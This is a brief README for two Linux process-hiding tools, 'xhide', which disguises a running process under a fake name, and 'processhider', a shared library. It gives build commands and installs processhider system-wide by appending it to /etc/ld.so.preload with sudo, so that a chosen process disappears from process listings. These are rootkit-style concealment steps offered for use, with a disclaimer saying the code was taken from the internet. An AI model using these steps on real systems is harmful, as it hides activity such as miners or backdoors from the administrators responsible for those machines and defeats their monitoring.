# pro
Xhide for linux

Usage :
  gcc -o xhide xhide.c

syntex :
  ./xhide -s "fake_process_name" -p test.pid ./Real_process 
  
Disclaimer : Code taken from internet. Auther is not responsible for anything. Use it as per ur own discretion.


Processhider usage...

First edit processhider.c and enter ur process name 

make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

